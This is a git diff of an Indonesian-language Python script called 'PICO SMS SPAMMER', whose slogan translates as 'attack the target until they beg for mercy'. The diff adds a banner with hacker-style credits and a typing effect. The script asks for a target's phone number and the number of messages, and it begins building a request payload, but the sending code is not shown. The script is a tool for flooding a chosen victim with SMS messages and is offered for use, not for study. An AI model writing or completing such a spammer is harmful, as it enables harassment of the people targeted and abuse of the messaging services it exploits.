@@ -1,12 +1,30 @@
-import requests
+#!/bin/python
 
-print('===============================================')
-print('PICO SMS SPAMMER')
-print('Serang Target Sampai Minta Ampun!')
-print('maked with love by : ~pico')
-print('===============================================')
+# import module
+import os
+import sys
+import time
 
-no = int(input('masukan no target nya brow :  '))
+# mengetik otomatis
+def mengetik(z):
+    for e in z + "\n":
+        sys.stdout.write(e)
+        sys.stdout.flush()
+        time.sleep(0.05)
+        
+# isi utama
+os.system("clear")
+print('+===============================================+')
+print('{+} Author   : Danendra')
+print('{+} Cyber Id : PicoXploit')
+print('{+} Slogan   : Destroy , Destroy , Destroy')
+print('+===============================================+')
+mengetik("PICO SMS SPAMMER")
+mengetik("Serang Target Sampai Minta Ampun!")
+mengetik("maked with \U0001F49A by : ~pico ")
+
+
+no = int(input('masukan no target nya brow : '))
 jum = int(input('masukan jumlah pesan : '))
 
 json = {'phone' :no}
